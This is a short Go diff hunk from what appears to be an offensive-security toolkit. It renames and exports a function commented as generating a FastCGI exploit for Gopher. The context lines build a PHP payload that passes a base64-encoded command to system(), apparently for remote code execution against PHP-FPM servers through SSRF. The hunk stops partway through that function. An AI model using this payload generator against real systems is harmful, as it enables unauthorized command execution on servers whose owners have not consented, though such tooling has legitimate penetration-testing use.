@@ -6,11 +6,11 @@ import (
 	"net/url"
 	"strconv"
 
-	"github.com/virzz/virzz/modules/clients/fastcgi"
+	"github.com/virzz/virzz/internal/fastcgi"
 )
 
-// ExpFastCGI -
-func expFastCGI(addr string, cmd, filename string) (string, error) {
+// GopherFastCGIExp Genrate the FASTCGI Exp For Gopher.
+func GopherFastCGIExp(addr string, cmd, filename string) (string, error) {
 	// "/usr/share/php/PEAR.php"
 	cmd = fmt.Sprintf(
 		`<?php system(base64_decode('%s'));?>`,
